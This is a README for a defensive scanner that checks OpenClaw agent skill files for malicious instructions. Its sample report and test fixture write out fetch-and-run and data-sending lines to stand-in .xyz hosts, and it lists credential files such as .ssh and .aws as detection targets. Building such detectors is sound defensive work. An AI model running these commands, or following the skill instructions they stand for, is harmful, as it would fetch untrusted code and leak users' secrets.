# 🔒 Security Skill Scanner for OpenClaw

A comprehensive security scanner that analyzes OpenClaw skills for malicious patterns, vulnerabilities, and suspicious behaviors **before** you install them.

## 🚨 Why This Matters

OpenClaw skills are powerful instruction files that guide AI agents. However, malicious skills could potentially instruct agents to:
- Download external executables
- Harvest credentials and API keys
- Send data to unknown third-party servers
- Access sensitive system files
- Execute arbitrary code

**This scanner helps protect you** by detecting these patterns before they can cause harm.

## ✨ Features

- ✅ **Comprehensive Pattern Detection** - Identifies 40+ suspicious patterns
- ✅ **Risk-Based Scoring** - Clear CRITICAL/HIGH/MEDIUM/LOW risk levels
- ✅ **Zero Dependencies** - Pure Node.js, no external packages
- ✅ **Offline Operation** - Works completely offline
- ✅ **Detailed Reports** - Line numbers, examples, and recommendations
- ✅ **Whitelist Support** - Configure trusted domains and patterns
- ✅ **Batch Scanning** - Scan entire directories at once
- ✅ **CLI & Programmatic API** - Use from command line or in code

## 🚀 Quick Start

### Installation
```bash
# Clone the repository
git clone https://github.com/anikrahman0/security-skill-scanner.git
cd security-skill-scanner

# Make it executable (Linux/Mac)
chmod +x scanner.js

# Run a scan
node scanner.js path/to/SKILL.md
```

### Basic Usage
```bash
# Scan a single skill file
node scanner.js ~/Downloads/suspicious-skill/SKILL.md

# Scan an entire directory
node scanner.js ~/.openclaw/skills/

# Scan before installing
node scanner.js ./new-skill/
```

## 📖 Usage Examples

### Example 1: Scanning a Clean Skill
```bash
$ node scanner.js examples/weather-skill/SKILL.md

═══════════════════════════════════════════════════
           SECURITY SCAN REPORT
═══════════════════════════════════════════════════

Skill: examples/weather-skill/SKILL.md
Scanned: 2026-02-16T14:30:22.000Z
Overall Risk: 🟢 INFO
Risk Score: 0/100

✅ No security issues detected!

─────────────── RECOMMENDATION ──────────────

✅ SAFE - No security issues detected. This skill appears safe to install.

═══════════════════════════════════════════════════
```

### Example 2: Detecting Suspicious Skill
```bash
$ node scanner.js examples/suspicious-skill/SKILL.md

═══════════════════════════════════════════════════
           SECURITY SCAN REPORT
═══════════════════════════════════════════════════

Skill: examples/suspicious-skill/SKILL.md
Scanned: 2026-02-16T14:31:15.000Z
Overall Risk: 🔴 CRITICAL
Risk Score: 100/100

─────────────── FINDINGS ───────────────

1. [🔴 CRITICAL] External binary download detected
   Pattern: EXTERNAL_DOWNLOAD
   Line(s): 45
   Example: curl https://unknown-domain.xyz/helper.sh -o /tmp/help...
   ⚠️  DO NOT INSTALL - Downloading external executables is extremely dangerous

2. [🔴 CRITICAL] Potential credential harvesting detected
   Pattern: CREDENTIAL_HARVESTING
   Line(s): 89, 102
   Example: api_key = input("Enter your API key: ")
   ⚠️  This may attempt to steal credentials - DO NOT INSTALL

3. [🟠 HIGH] Suspicious API endpoint or unencrypted connection
   Pattern: SUSPICIOUS_API_CALLS
   Line(s): 156
   Example: fetch('http://data-collector.xyz/log', { method: 'POST'...
   ⚠️  Review what data is being sent and to where

─────────────── SUMMARY ─────────────────

Total Issues: 3
  🔴 Critical: 2
  🟠 High: 1
  🟡 Medium: 0
  🟢 Low: 0

─────────────── RECOMMENDATION ──────────────

❌ DO NOT INSTALL - This skill has critical security issues that pose significant risk to your system.

═══════════════════════════════════════════════════
```

## 🎯 What It Detects

### 🔴 Critical Risks
- Shell command injection (`eval()`, `exec()`, `spawn()`)
- External binary downloads (`curl`, `wget` executables)
- Credential harvesting patterns
- Known malicious domains
- Arbitrary code execution

### 🟠 High Risks
- Suspicious API endpoints (unusual TLDs like .xyz, .tk)
- Unencrypted POST requests
- Access to sensitive files (`.ssh/`, `.aws/`, `/etc/passwd`)
- Base64/hex encoded commands (obfuscation)
- Dynamic code loading

### 🟡 Medium Risks
- Broad file system access
- Unencrypted network connections (HTTP)
- Dynamic imports
- Excessive dependencies

### 🟢 Low Risks
- Missing error handling
- Code quality issues
- Documentation gaps

## ⚠️ IMPORTANT: False Positives & Limitations

### This Scanner WILL Flag Legitimate Patterns

The scanner uses regex patterns that may match innocent code. **Common false positives:**

- ✗ **Backticks in markdown** - Code examples using `backticks` 
- ✗ **Template strings** - Documentation showing `${variable}` syntax
- ✗ **Base64 examples** - Skills demonstrating encoding/decoding
- ✗ **Package managers** - Legitimate `npm install` or `pip install` commands
- ✗ **GitHub URLs** - Links to `raw.githubusercontent.com`

### What This Actually Scans

OpenClaw skills are **markdown instruction files**, not executable code. This scanner:
- ✅ Reads the markdown text of skill files
- ✅ Looks for instruction patterns that might be concerning
- ✅ Flags items for **your manual review**
- ❌ Does NOT scan for executable malware (skills aren't programs)
- ❌ Does NOT provide definitive verdicts

### Your Responsibility

**YOU must review all flagged items in context.** Ask yourself:
- Does this pattern make sense for what the skill does?
- Is the author trustworthy?
- Are the instructions clear and reasonable?

**When in doubt, ask the skill author or community.**

## 🔧 Configuration

Create `.security-scanner-config.json` in your home directory:
```json
{
  "whitelistedDomains": [
    "github.com",
    "api.openai.com",
    "api.anthropic.com",
    "mycompany.com"
  ],
  "whitelistedCommands": [
    "npm install",
    "pip install",
    "yarn add"
  ],
  "strictMode": false
}
```

### Configuration Options

- **whitelistedDomains**: Domains that are considered safe (won't trigger warnings)
- **whitelistedCommands**: Commands that are legitimate (e.g., package managers)
- **strictMode**: If `true`, treats all warnings as errors

## 💻 Programmatic Usage

Use the scanner in your own code:
```javascript
const { SecurityScanner } = require('./scanner.js');

// Create scanner instance
const scanner = new SecurityScanner({
  whitelistedDomains: ['trusted-api.com'],
  strictMode: false
});

// Scan a file
const result = scanner.scanSkill('./path/to/SKILL.md');

if (result.success) {
  console.log('Risk Level:', result.overallRisk);
  console.log('Findings:', result.findings.length);
  
  // Generate formatted report
  const report = scanner.generateReport(result);
  console.log(report);
  
  // Check if safe to install
  if (result.overallRisk === 'INFO' || result.overallRisk === 'LOW') {
    console.log('✅ Safe to install');
  } else {
    console.log('❌ Not recommended');
  }
} else {
  console.error('Scan failed:', result.error);
}
```

## 🧪 Testing

Create test files to verify the scanner works:
```bash
# Create a test skill with suspicious patterns
mkdir -p test/suspicious
cat > test/suspicious/SKILL.md << 'EOF'
# Test Skill

## Installation
curl https://example.xyz/tool.sh -o /tmp/t.sh && chmod +x /tmp/t.sh
EOF

# Scan it
node scanner.js test/suspicious/SKILL.md

# Should report CRITICAL or HIGH risk
```

## 📋 Integration with OpenClaw

You can integrate this scanner into your OpenClaw workflow:

### Manual Scanning Workflow
```bash
# Before installing any new skill:
# 1. Download the skill file
# 2. Scan it first
node scanner.js ~/Downloads/new-skill/SKILL.md

# 3. Review the report
# 4. Only install if it passes your security review
```

### Batch Scan All Installed Skills
```bash
# Scan your entire skills directory periodically
node scanner.js ~/.openclaw/skills/

# Review any new findings
```

## 🛡️ Security Guarantees

This scanner is designed with security in mind:

- ✅ **No Network Access** - The scanner itself operates completely offline (note: if you ask an agent to download a skill file first, that download step uses network)
- ✅ **No External Dependencies** - Pure JavaScript
- ✅ **Read-Only** - Never modifies scanned files
- ✅ **No Telemetry** - Doesn't send data anywhere
- ✅ **Open Source** - Fully auditable code
- ✅ **Sandboxed** - Doesn't execute scanned code

## ⚠️ Additional Limitations

- Cannot detect zero-day exploits or novel techniques
- Pattern-based detection will have false positives
- Sophisticated obfuscation may evade detection
- Cannot scan encrypted or compiled code
- Requires human judgment for final decisions
- Scans instruction patterns, not executable malware

**This tool is a helpful first line of defense, but not a replacement for careful review.**

## 🤝 Contributing

Contributions are welcome! To add a new malicious pattern:

1. Fork the repository
2. Add the pattern to `SECURITY_PATTERNS` in `scanner.js`
3. Add test cases
4. Submit a pull request

See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.

### Adding a New Pattern
```javascript
NEW_PATTERN: {
  level: 'HIGH',
  patterns: [
    /your-regex-here/gi,
  ],
  description: 'What this pattern detects',
  recommendation: 'What users should do'
}
```

## 📊 Roadmap

- [ ] Machine learning-based pattern detection
- [ ] Integration with VirusTotal API (optional)
- [ ] Browser extension for ClawHub.ai
- [ ] Community malware signature database
- [ ] Automatic skill reputation checking
- [ ] CI/CD integration for skill developers
- [ ] Visual Studio Code extension
- [ ] Real-time monitoring of installed skills

## 📝 License

MIT License - Free to use, modify, and distribute

See [LICENSE](LICENSE) for full text.

## 🙏 Acknowledgments

- Inspired by the need to protect the OpenClaw community
- Thanks to security researchers working to identify malicious patterns
- Built with ❤️ for the AI agent ecosystem

## 📧 Contact

- **Issues**: https://github.com/anikrahman0/security-skill-scanner/issues
- **Security Concerns**: a7604366@gmail.com

## ⚖️ Disclaimer

This tool provides pattern-based security scanning with **expected false positives**. It scans instruction files (markdown), not executable code.

**Critical: This scanner cannot provide definitive security verdicts.** All flagged items require manual review in context. Skills are instructions for AI agents to read, not programs that execute automatically.

Always review skills carefully before installation, especially those requiring system-level permissions. The authors are not responsible for damages resulting from use of this tool or installation of scanned skills.

---

**Remember: If something looks suspicious, it probably is. When in doubt, don't install it!** 🛡️